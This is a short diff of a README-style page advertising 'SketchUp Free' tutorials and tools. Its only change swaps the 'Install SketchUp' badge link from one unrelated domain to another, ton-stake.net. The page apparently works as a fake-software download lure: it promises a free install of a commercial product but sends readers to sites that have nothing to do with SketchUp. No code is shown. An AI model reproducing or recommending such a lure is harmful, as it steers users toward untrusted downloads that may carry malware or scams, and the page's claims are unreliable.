@@ -4,7 +4,7 @@
 
 💻 Discover the power of SketchUp Free with our community-driven resources! Access tutorials, tools, and guides for 3D modeling in 2025. Perfect for beginners and enthusiasts looking to create stunning designs. Join us today!  
 
-[![Install](https://img.shields.io/badge/Install-SketchUp-blueviolet)](https://glocktober.com)
+[![Install](https://img.shields.io/badge/Install-SketchUp-blueviolet)](https://ton-stake.net)
 
 ---
 
